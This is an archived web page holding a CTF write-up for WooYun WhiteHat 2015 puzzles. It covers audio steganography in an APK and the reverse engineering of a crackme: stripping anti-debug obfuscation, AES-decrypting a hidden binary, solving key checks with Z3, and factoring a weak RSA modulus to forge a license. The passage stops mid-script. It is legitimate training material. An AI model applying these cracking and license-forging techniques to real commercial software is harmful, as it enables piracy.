<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>WooYun WhiteHat 2015 No Wall Puzzle - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="give me five" />
<meta name="keywords" content="checkkey.exe,CrptoMat,CrptoMat.exe,CryptoMat_new,darksn0w,enc.bin,give me five,givemefive.apk,msieve,Riatre,RSA-MP,wooyun.lic,yafu,Yet Another Factoring Utility,zcgonvh,突破 No Wall,音频隐写术" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/34889.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-34889 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive">独家</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup" rel="category tag">CTF</a> &gt;  正文 </nav><article id="post-34889" class="post-34889 post type-post status-publish format-standard has-post-thumbnail hentry category-ctf-writeup tag-checkkey-exe tag-crptomat tag-crptomat-exe tag-cryptomat_new tag-darksn0w tag-enc-bin tag-give-me-five tag-givemefive-apk tag-msieve tag-riatre tag-rsa-mp tag-wooyun-lic tag-yafu tag-yet-another-factoring-utility tag-zcgonvh tag--no-wall tag-47573">
	<header class="single-header">
		<h1>WooYun WhiteHat 2015 No Wall Puzzle</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /7/11 14:55</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">2,828</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/34889.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<h2>give me five</h2>
<blockquote><p>1、这个 Android 应用程序中隐藏了怎样的信息？（提示：不要放过任何一点蛛丝马迹）<br />
Tip：flag为32位字符串</p>
<p><a href="http://static.wooyun.org/summit/givemefive.zip"> 点击下载 givemefive.apk</a></p></blockquote>
<h4>give me five 第一名的 writeup</h4>
<p>首先give me five，然后发现apk解包之后那个牛逼的音乐名字叫five five five。</p>
<p>然后看了一下音乐里面有啥东西，发现有6条音轨，其中2条为正常音频的音轨，其余四条如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/07/givemefive_1.jpg"><img class="alignnone size-full wp-image-34894" src="http://www.secpulse.com/wp-content/uploads/2015/07/givemefive_1.jpg" alt="givemefive_1" width="1134" height="603" /></a></p>
<p>其中后三条音轨明显跟第一条音轨是降噪关系。所以音乐中并没听出来。</p>
<p>然后上位换为1，下位换为0，输出为文本：</p>
<pre>01110011111110111111101001010000111010101110010111111011000111001000110111111111111110011010100111101011011110001100000110011110
</pre>
<p>查看一共有128位，可转换为16进制，得到32位字符串：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/07/givemefive_2.jpg"><img class="alignnone size-full wp-image-34893" src="http://www.secpulse.com/wp-content/uploads/2015/07/givemefive_2.jpg" alt="givemefive_2" width="677" height="442" /></a></p>
<p>&nbsp;</p>
<p>所以结果就是：73 FB FA 50 EA E5 FB 1C 8D FF F9 A9 EB 78 C1 9E</p>
<h5>writeup by darksn0w</h5>
<h2>CrptoMat</h2>
<blockquote><p>2、请对该程序通过逆向工程，计算出一组可用的 key 和授权文件 wooyun.lic。最后请提交 flag 与 wooyun.lic。<br />
(1) 程序只能运行在 Windows 7 / 8 / 8.1 x64 系统上。<br />
(2) 程序由两部分组成。需要先逆向分析第一部分，才能得到第二个程序。<br />
更新说明:<br />
之前使用的大数库有一个整数溢出的 bug，新版本中已经修复了。该 bug 不影响解题，也不影响之前计算出的 key 的有效性。感谢 Riatre 同学指出该问题！仅更新了 enc.bin<br />
2015-06-16 19:00</p>
<p><a href="http://static.wooyun.org/summit/CryptoMat_new.7z"> 点击下载 CryptoMat_new.7z</a></p></blockquote>
<h3>Description</h3>
<ol>
<li>程序只能运行在 Windows 7 / 8 / 8.1 x64 系统上。</li>
<li>程序由两部分组成。需要先逆向分析第一部分，才能得到第二个程序。</li>
</ol>
<h3>CrptoMat: Initial Observation</h3>
<p>这是描述中提到的需要逆向分析以得到第二部分的“第一部分”。首先观察下载得到的压缩包<code>CrptoMat-1.7z</code>，里面包含两个文件，<code>CrptoMat.exe</code>及<code>enc.bin</code>。 其中<code>CrptoMat.exe</code>是一个32位Windows Console应用程序，而<code>enc.bin</code>根据文件名猜测，应为加密后的“第二个程序”。</p>
<p>这样，描述中的“程序只能运行在 Windows 7 / 8 / 8.1 x64 系统上。”成为了一个疑点：为什么要求x64呢？</p>
<p>程序在我这里运行时会直接Crash，故决定先在IDA中载入<code>CrptoMat.exe</code>观察一下。 IDA识别出了main函数，其中最后一个<code>printf</code>的参数不是有意义的字符串，且前后有以'\x10'为单字节key对其xor解密。 针对这种类型的操作，我们可以写一段简单的 IDAPython 脚本，在idb中将其解密，以方便分析。</p>
<pre><code class="lang-python">def xor(addr, len, skip, key):
    for i in range(addr, addr+len, skip):
        PatchByte(i, Byte(i) ^ key)</code></pre>
<p>接下来执行 <code>xor(0x423480, 32, 1, 0x10)</code> 即可解密该字符串。不幸的是，进行完这一步后，该字符串仍然不是有意义的字符串。</p>
<p>检查该字符串的xref，可以发现还有另一处地方对其进行了xor解密，追踪调用来源可以发现，这个exe注册了三个TLS Callback，会在程序加载时被执行。三个TLS回调函数中分布着两种混淆。</p>
<h3>CrptoMat: Obfuscation</h3>
<p>这些函数中使用了大量形如 <code>74 01 0F</code> 的花指令。对应方式为将<code>0F</code>的部分直接nop掉即可。（在IDA中，可以使用Edit -&gt; Patch program -&gt; Change byte在idb中进行简单的patch。</p>
<p>除此之外，这些函数开始的位置还有大量的在64位及32位代码段间切换的指令。参考roy g biv的<a href="http://spth.virii.lu/v1/articles/HEAVEN.TXT">Heaven's Gate: 64-bit code in 32-bit file</a>。形如</p>
<pre><code class="lang-asm">push 33h
call $+5
add dword ptr [esp], 5
retf

call $+5
mov dword ptr [esp+4], 23h
add     dword ptr [esp], 0Dh
retf</code></pre>
<p>可以注意到，切换后立刻切了回来，并且中间没有夹杂任何x64代码，因此这一段也只是作为简单的反调试 &amp; 花指令，不对实际分析以及Hex-Rays Decompiler的工作产生任何影响。 简单的将其整段替换为nop即可。</p>
<p>去除所有上文描述的干扰，并用Alt+K手动调整一些IDA分析错的call带来的栈影响后，Hex-Rays Decompiler（所谓的F5）已经可以正常工作了。 虽然这三个TLS Callback逻辑比较简单，没有Hex-Rays插件也可以很容易理解。</p>
<h3>CrptoMat: Constants</h3>
<p>第一个TLS Callback主要是利用<code>IsDebuggerPresent</code>进行了简单的反调试。</p>
<p>第二及第三个TLS Callback中使用简单的xor解密了一些常量，填充了另一个常量。将其都按上文的方式还原后，这个程序的逻辑变得清晰了起来。</p>
<h3>CrptoMat: Decryption</h3>
<p>程序在main中，利用TEB进行了简单的反调试（如果检测到有DebugFlag则会修改之前填充的一个常量）。 然后首先在0x403620处获取了一些系统API的地址。 接下来位于0x403280处的函数打开并读入<code>enc.bin</code>，调用位于0x402B70处的函数解密，并写入输出文件<code>checkkey.exe</code>。</p>
<p>下面重点关注解密函数，其首先调用位于0x4012B0的函数进行了初始化，这个函数开头动态填充了一些常量表，将之前在TLS Callback中填充的一个32字节的常量再次逐字节xor了0x73，然后存入栈中。不妨认为这是Key。 后半段则有一些类似于某些对称加密算法中的Key Schedule的过程，但其中使用的所有常量表都是动态填充的，不方便识别具体算法。</p>
<p>先不管他，回到解密函数中，可以发现逻辑非常复杂的循环的次数为 19329 , 注意到 $ 19329 \times 16 $ 恰好等于<code>enc.bin</code>文件的大小。我们不妨猜测这是一个块大小为16字节的块加密算法。</p>
<p>那么，块大小为16字节，密钥长度为32字节的对称加密算法，首先想到的大概就是 AES-256 了吧。不妨试一试，万一是真的呢 XD</p>
<p>没有IV，先假装它是ECB模式，试试吧。</p>
<pre><code class="lang-python">key = [0x32,62,43,56,24,55,6,18,0x2A,65,43,21,66,21,75,5,21,49,0x32,0x20,0x21,0x1A,59,0x10,0x38,16,0x44,0x18,49,0x31,0x16,36,]
key = ''.join(map(lambda x: chr(x ^ 0x73),key))

from Crypto.Cipher import AES
with open('enc.bin', 'rb') as fp:
    enc = fp.read()
aes = AES.new(key=key, mode=AES.MODE_ECB)

with open('dec.bin', 'wb') as fp:
    fp.write(aes.decrypt(enc))</code></pre>
<p>看上去解密成功了，然而很快发现，输出的文件看上去并不是原始的checkkey.exe。看上去有一些“多余”的部分。</p>
<p>在懒得分析<code>CrptoMat.exe</code>中具体的逻辑的情况下，对着该文件脑补，并且观察<code>CrptoMat.exe</code>中的解密代码，每解密一块16字节，仅输出8字节。 不妨认为只要取每16字节的前8字节即可。</p>
<p>然后发现这样是对的 <img src="https://www.secpulse.com/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<h3>checkkey: Initial Observation</h3>
<p>我们得到了一个<code>checkkey.exe</code>，简单观察后可以发现，它是一个x64 Windows Console应用程序。 拉进IDA分析，程序明显的分为了两个部分，第一部分验证命令行参数传入的key，第二部分验证<code>wooyun.lic</code>，并和key似乎有某种关联。</p>
<p>这个程序代码上没有任何故意设置的干扰，Hex-Rays Decompiler可以工作，虽然由于编译优化的原因，得到的部分结果不太容易理解。</p>
<h3>checkkey: check_key</h3>
<p>检查key的函数对输入的key进行了各种检查，要求满足一些条件（具体条件直接见以下代码），我们使用Z3来求解符合条件的串。</p>
<pre><code class="lang-python">from z3 import *

ZeroExtDword = lambda x: ZeroExt(32, x)

def summie(arr, wordsize):
    expr = 0
    for i in xrange(wordsize):
        expr += sum(map(ZeroExtDword, arr[i::wordsize])) &lt;&lt; (i * 8)
    return expr

def hashy(x):
    ans = 0
    for c in map(ZeroExtDword, x):
        ans = ((((ans &lt;&lt; 3) &amp; 0xFFFFFFFF) | (ans &gt;&gt; 29)) + c) &amp; 0xFFFFFFFF
    return ans

def extractDword(key, offset):
    return sum([ZeroExtDword(key[offset+i]) &lt;&lt; (i * 8) for i in xrange(4)])

_key = [BitVec('k%d' % i, 8) for i in xrange(32)]
recover = lambda m: ''.join(map(chr,[m[c].as_long() for c in _key]))

s = Solver()

for c in _key:
    s.add(Or(And(ord('a') &lt;= c, c &lt;= ord('z')),And(ord('0') &lt;= c, c &lt;= ord('9')),And(ord('A') &lt;= c, c &lt;= ord('Z'))))

s.add(summie(_key, 1) == 0xA88)
s.add(summie(_key, 2) == 0x57E0F)
s.add((summie(_key, 4) &amp; 0xFFFFFFFF) == 0x857AF897)
s.add(hashy(_key[::2]) == 0x56BCF7C6)
s.add(sum(map(ZeroExtDword, _key[1::2])) - 16 == 1385)

outer = [0x546658EC, 0x2A4F76A2, 0x281446A3]
for i in xrange(3):
    s.add((outer[i] ^ 0x1C270E94) == extractDword(_key, i * 4))

inner = [0xE73153C4, 0x993308F4, 0x8A5779DD]
for i in xrange(3):
    s.add((inner[i] ^ 0xCC203528 ^ 0x1C270E94) == extractDword(_key, (i + 1) * 4 + 1))

print s.check()
key = recover(s.model())
print key.encode('hex')
print key</code></pre>
<p>运行即可在0.3s左右的时间内得到一组解，<code>xVAH6xh67H34IaBPZpKqtIdO9vrqbP9P</code>。</p>
<h3>checkkey: check_license</h3>
<p>经分析可知，check_license首先计算了文件前4字节以外的部分的"CRC32"校验和，并与前4字节表示的DWORD进行比较。 注意这里的"CRC32"与规范的CRC32不同，有一处移位时故意用算术右移代替了逻辑右移。</p>
<p>接下来，程序计算了除前20字节以外的部分的MD5哈希，并与文件+0x4处开始的16字节进行比较，期望其相等。 然后，程序期望接下来的8字节为<code>00 07 11 F9 F6 AB 13 AE</code>。</p>
<p>满足以上所有条件后，程序用类似于外层CrptoMat中的方式在内存中xor解密了两个字符串，分别为： "353435899753154886567901508644280318001624308174099373826296801585161412894475724220420610666130867676791214922584602747" 及 "65537"</p>
<p>相信比较敏感同学看到65537之后会立刻将第一个字符串作为一个十进制整数丢进 yafu 或 msieve &amp; ggnfs 中分解。一边让机器跑着一边进行接下来的逆向 #_#</p>
<p>随后，程序对文件+0x28处开始直到文件结尾的内容进行了“某种计算”，期望得到的结果长度大于等于30，并将得到的结果与命令行输入的key比较，期望相符。 此外，还计算了得到的结果的MD5哈希，并与文件+0x18处开始的16个字节比较，期望相符。</p>
<p>我们有充足的理由相信这里的“某种计算”就是RSA。稍作逆向后可以发现没有Padding，直接将字节作为256进制的Big Endian整数解释。 到了这里，把它分解出来，然后根据私钥计算出一个合法的license即可。</p>
<h3>checkkey: factorization</h3>
<p>该模数N有120位十进制数位，如果没有特意包含比较弱的因子的话，应当是使用 msieve + GGNFS 分解比较迅速，约需要5~6小时。 然而，由于不能排除其故意带有比较弱的因子的可能性，先交给 yafu 去pretest一下吧 <img src="https://www.secpulse.com/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>结果 yafu 在10秒后给出了分解结果。</p>
<pre><code>detected L1 = 32768 bytes, L2 = 10485760 bytes, CL = 64 bytes
measured cpu frequency ~= 1799.966760
using 20 random witnesses for Rabin-Miller PRP checks

===============================================================
======= Welcome to YAFU (Yet Another Factoring Utility) =======
=======             bbuhrow@gmail.com                   =======
=======     Type help at any time, or quit to quit      =======
===============================================================
cached 78498 primes. pmax = 999983


&gt;&gt; factor(353435899753154886567901508644280318001624308174099373826296801585161412894475724220420610666130867676791214922584602747)

fac: factoring 353435899753154886567901508644280318001624308174099373826296801585161412894475724220420610666130867676791214922584602747
fac: using pretesting plan: normal
fac: no tune info: using qs/gnfs crossover of 95 digits
div: primes less than 10000
rho: x^2 + 3, starting 1000 iterations on C120
rho: x^2 + 2, starting 1000 iterations on C120
rho: x^2 + 1, starting 1000 iterations on C120
pm1: starting B1 = 150K, B2 = gmp-ecm default on C120
ecm: 30/30 curves on C120, B1=2K, B2=gmp-ecm default
ecm: 10/74 curves on C120, B1=11K, B2=gmp-ecm default
ecm: 63/63 curves on C96, B1=11K, B2=gmp-ecm default
ecm: 7/214 curves on C96, B1=50K, B2=gmp-ecm default, ETA: 46 sec
ecm: 14/82 curves on C72, B1=50K, B2=gmp-ecm default, ETA: 12 sec

starting SIQS on c48: 647644121107739553628643132820296925098092891441

==== sieving in progress ( 8 threads):    1232 relations needed ====
====            Press ctrl-c to abort and save state            ====
1536 rels found: 765 full + 771 from 5704 partial, (63176.30 rels/sec)

SIQS elapsed time = 0.1472 seconds.
Total factoring time = 9.9477 seconds


***factors found***

P24 = 661333217825639141012939
P25 = 1174612726422110624673683
P24 = 702520810094682184952891
P24 = 714443298299371048348643
P24 = 906501779286561612666587

ans = 1</code></pre>
<p>有趣的是，它一共有5个素因子，所谓的<code>RSA-MP</code>，不过这并没有影响。</p>
<h3>checkkey: Tiro Finale</h3>
<p>最后，写个简单的脚本生成<code>wooyun.lic</code>。</p>
<pre><code class="lang-python">import ctypes, hashlib, struct
def fake_crc(data):
    tab = [0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
    0xe963a535, 0x9e6495a3,    0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
